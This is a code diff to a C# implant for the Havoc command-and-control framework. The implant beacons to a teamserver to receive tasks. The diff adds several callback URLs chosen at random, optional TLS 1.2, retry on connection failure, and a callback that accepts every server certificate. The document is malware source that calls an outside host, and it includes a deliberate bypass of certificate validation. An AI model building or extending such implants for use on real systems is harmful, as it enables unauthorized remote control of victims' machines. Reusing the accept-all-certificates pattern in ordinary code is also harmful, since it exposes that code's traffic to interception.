@@ -20,11 +20,11 @@ namespace HavocImplant
     public class Implant
     {
         // Altered by build
-        string url = Config.url;
+        string[] url = Config.url;
         public int sleepTime = Config.sleepTime;
         int timeout = Config.timeout;
         public int maxTries = Config.maxTries;
-
+        public bool secure = Config.secure;
         // Communication with Teamserver
         byte[] id;
         byte[] magic;
@@ -47,6 +47,7 @@ namespace HavocImplant
         static void Main(string[] args)
         {
             Implant implant = new Implant();
+            if (implant.secure) ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             List<String> taskArray = new List<String>();
             while (!implant.registered) implant.Register();
             Console.WriteLine($"Implant will disconnect after {implant.maxTries} fails");
@@ -187,10 +188,19 @@ namespace HavocImplant
         }
         public string sendReq(string requestBody, byte[] agentHeader)
         {
+            bool AcceptAllCertifications(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certification, System.Security.Cryptography.X509Certificates.X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors)
+            {
+                return true;
+            } 
+            Random rand = new Random();
             string responseString = "";
-            bool reqSuccess = false;
-            var request = (HttpWebRequest)WebRequest.Create(url);
+            ServicePointManager
+    .ServerCertificateValidationCallback += 
+    (sender, cert, chain, sslPolicyErrors) => true;
+            //if (secure) System.Net.ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(AcceptAllCertifications);
 
+            var request = (HttpWebRequest)WebRequest.Create(url[rand.Next(0, url.Length)]);
+            
             ArrayList arrayList = new ArrayList();
             arrayList.AddRange(agentHeader);
 
@@ -218,6 +228,7 @@ namespace HavocImplant
                     outputData = "";
                     timeoutCounter = 0;
                 }
+                Console.WriteLine("Setting counter to 0");
                 timeoutCounter = 0;
             }
             catch (WebException ex)
@@ -229,11 +240,12 @@ namespace HavocImplant
                     byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
                     responseString = Encoding.UTF8.GetString(bytes);
                 }
-                if (ex.Status == WebExceptionStatus.Timeout)
+                if (ex.Status == WebExceptionStatus.Timeout || ex.Status == WebExceptionStatus.ConnectFailure )
                 {
                     timeoutCounter += 1;
                     if (timeoutCounter == maxTries) Environment.Exit(Environment.ExitCode);
                 }
+                Console.WriteLine($"status code: {ex.Status}");
             }
             
             outputData = "";
